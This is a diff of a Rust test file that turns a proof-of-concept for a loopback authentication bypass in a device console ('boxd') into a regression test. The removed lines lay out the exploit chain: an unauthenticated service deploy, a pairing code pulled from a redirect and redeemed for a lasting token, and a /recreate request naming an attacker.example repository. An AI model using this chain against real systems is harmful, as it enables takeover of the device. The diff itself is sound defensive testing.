@@ -59,92 +59,50 @@ async fn send(app: &Router, req: Request<Body>) -> (StatusCode, String, String) 
 }
 
 #[tokio::test]
-async fn loopback_peer_has_operator_authority_with_no_credentials() {
+async fn loopback_does_not_grant_authority() {
     let (_tmp, paths, app) = app();
 
-    // Precondition: NO operator has ever paired. Zero sessions, zero codes.
+    // Precondition: no operator has ever paired. Zero sessions, zero codes.
     assert!(boxd::auth::is_claimable(&paths));
     assert!(boxd::auth::list(&paths).is_empty(), "no credentials exist");
 
-    // ---- control: identical request from the LAN, no token -> rejected -----
-    let (s, b, _) = send(
-        &app,
-        Request::get("/api/v1/status")
-            .extension(lan())
-            .body(Body::empty())
-            .unwrap(),
-    )
-    .await;
-    println!("[control] LAN      GET  /api/v1/status  -> {s} {b}");
-    assert_eq!(s, StatusCode::UNAUTHORIZED);
-
-    // ---- 1. loopback, no token -> management READ --------------------------
-    let (s, b, _) = send(
-        &app,
-        Request::get("/api/v1/status")
-            .extension(loopback())
-            .body(Body::empty())
-            .unwrap(),
-    )
-    .await;
-    println!("[1] LOOPBACK GET  /api/v1/status  -> {s} {b}");
-    assert_eq!(s, StatusCode::OK, "loopback bypasses auth entirely");
-
-    // ---- 2. loopback, no token -> management WRITE (deploy a service) ------
-    let (s, b, _) = send(
-        &app,
-        Request::post("/api/v1/services")
+    // Reaching the loopback interface used to BE the credential. It is not any
+    // more, and it must not become one again: every service the Box runs can
+    // reach 127.0.0.1:2693 too, so this was a path from "deploy an app" to
+    // "own the console" (proven: /devices/add minted a pairing code and handed
+    // it back in the redirect).
+    for (method, path, body) in [
+        ("GET", "/api/v1/status", None),
+        ("GET", "/", None),
+        (
+            "POST",
+            "/api/v1/services",
+            Some(json!({"name":"pwned","index_html":"<h1>owned</h1>"}).to_string()),
+        ),
+        ("POST", "/devices/add", Some(String::new())),
+        ("POST", "/system/channel", Some(String::new())),
+    ] {
+        let req = Request::builder()
+            .method(method)
+            .uri(path)
             .header("content-type", "application/json")
-            .extension(loopback())
-            .body(Body::from(
-                json!({"name":"pwned","index_html":"<h1>owned</h1>"}).to_string(),
-            ))
-            .unwrap(),
-    )
-    .await;
-    println!("[2] LOOPBACK POST /api/v1/services -> {s} {b}");
-    assert_eq!(s, StatusCode::OK, "loopback deploys with no credentials");
+            .extension(loopback());
+        let (s, b, _) = send(&app, req.body(body.map(Body::from).unwrap_or(Body::empty())).unwrap()).await;
+        println!("[loopback] {method} {path} -> {s}");
+        assert_ne!(
+            s,
+            StatusCode::OK,
+            "REGRESSION: loopback carried authority for {method} {path}: {b}"
+        );
+    }
 
-    // ---- 3. loopback, no token -> MINT A DURABLE OPERATOR CREDENTIAL -------
-    // /devices/add mints a pairing code and returns it in the Location header.
-    let (s, _, loc) = send(
-        &app,
-        Request::post("/devices/add")
-            .extension(loopback())
-            .body(Body::empty())
-            .unwrap(),
-    )
-    .await;
-    println!("[3a] LOOPBACK POST /devices/add   -> {s} {loc}");
-    let decoded = urlencoding::decode(&loc).unwrap().into_owned();
-    let code = decoded
-        .split("single use): ")
-        .nth(1)
-        .and_then(|s| s.split(' ').next())
-        .expect("pairing code leaked in the redirect")
-        .to_string();
-    println!("[3a] minted pairing code: {code}");
+    // Nothing was created by any of that.
+    assert!(boxd::auth::list(&paths).is_empty(), "a session appeared");
+    assert!(boxd::auth::is_claimable(&paths), "the box was claimed");
 
-    // Redeem it from the LAN as an "agent" -> a permanent Bearer token.
-    let (s, b, _) = send(
-        &app,
-        Request::post("/pair/redeem")
-            .header("content-type", "application/x-www-form-urlencoded")
-            .header("accept", "application/json")
-            .extension(lan())
-            .body(Body::from(format!("code={code}")))
-            .unwrap(),
-    )
-    .await;
-    println!("[3b] LAN      POST /pair/redeem   -> {s} {b}");
-    assert_eq!(s, StatusCode::OK);
-    let token = serde_json::from_str::<serde_json::Value>(&b).unwrap()["token"]
-        .as_str()
-        .unwrap()
-        .to_string();
-
-    // That token now drives the box from off-box, forever.
-    let (s, b, _) = send(
+    // A real session still works, from anywhere.
+    let token = boxd::auth::mint_session(&paths, "test").unwrap();
+    let (s, _, _) = send(
         &app,
         Request::get("/api/v1/status")
             .header("authorization", format!("Bearer {token}"))
@@ -153,47 +111,9 @@ async fn loopback_peer_has_operator_authority_with_no_credentials() {
             .unwrap(),
     )
     .await;
-    println!("[3c] LAN+TOKEN GET /api/v1/status -> {s} {b}");
-    assert_eq!(s, StatusCode::OK, "durable off-box operator session obtained");
-
-    // ---- 4. loopback, no token -> DESTRUCTIVE /recreate --------------------
-    // key_entry_is_safe (pages.rs:1112) returns true for loopback, so both the
-    // middleware and the second gate let it through.
-    let (s, _, loc) = send(
-        &app,
-        Request::post("/recreate")
-            .header("content-type", "application/x-www-form-urlencoded")
-            .extension(loopback())
-            .body(Body::from(
-                "repo_url=https%3A%2F%2Fattacker.example%2Frepo.git&identity=SOMEKEY&confirm=on",
-            ))
-            .unwrap(),
-    )
-    .await;
-    println!("[4] LOOPBACK POST /recreate       -> {s} {loc}");
-    assert!(
-        !loc.contains("not+encrypted") && !loc.contains("Confirm+the"),
-        "key_entry_is_safe did NOT block loopback; got {loc}"
-    );
-
-    // ---- 5. loopback, no token -> the MCP agent tool surface ---------------
-    let (s, b, _) = send(
-        &app,
-        Request::post("/mcp")
-            .header("content-type", "application/json")
-            .extension(loopback())
-            .body(Body::from(
-                json!({"jsonrpc":"2.0","id":1,"method":"tools/list"}).to_string(),
-            ))
-            .unwrap(),
-    )
-    .await;
-    println!("[5] LOOPBACK POST /mcp tools/list -> {s} (len {})", b.len());
-    assert_eq!(s, StatusCode::OK, "MCP tool surface open to loopback");
+    assert_eq!(s, StatusCode::OK, "a valid session must still be honoured");
 }
 
-/// Does the static-site health check actually stop the source_path exfil the
-/// claim leans on? Test both the naive form and the symlink form.
 #[tokio::test]
 async fn source_path_exfil_variants() {
     let (tmp, paths, router) = app();
